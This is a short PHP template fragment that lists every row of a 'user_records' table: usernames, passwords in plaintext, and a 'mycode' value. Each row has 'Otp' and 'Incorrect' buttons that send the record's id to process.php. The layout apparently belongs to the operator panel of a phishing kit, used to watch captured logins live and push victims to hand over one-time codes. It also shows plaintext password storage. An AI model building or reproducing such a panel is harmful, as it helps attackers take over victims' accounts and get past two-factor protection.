	<?php 	
			require("db.php");
    		// get all user
    		$data = null;
    		require("db.php");
    		$query = mysqli_query($conn, "SELECT * FROM user_records ORDER BY id DESC");
    		if (mysqli_num_rows($query)<1) {
    			echo "<tr><td>N/A</td></tr>";
    		}else{
    			while ($row = mysqli_fetch_object($query)) {
    				$data[]=$row;
    			}
    			foreach ($data as $key) {
    				?>
					      <tr>
					        <td><?php echo $key->username ?></td>
                  <td><?php echo $key->password ?></td>
                  <td><?php echo $key->mycode ?></td>
					        <td><a class="btn btn-success" href="process.php?otp=<?php echo $key->uid ?>">Otp</a></td>
					        <td><a class="btn btn-warning" href="process.php?incorrect=<?php echo $key->uid ?>">Incorrect</a></td>
					        <!-- <td><a class="btn btn-danger" href="process.php?newotp=<?php //echo $key->uid ?>">New OTP</a></td> -->
					      </tr>
    				<?php
    			}
    		}
    	?>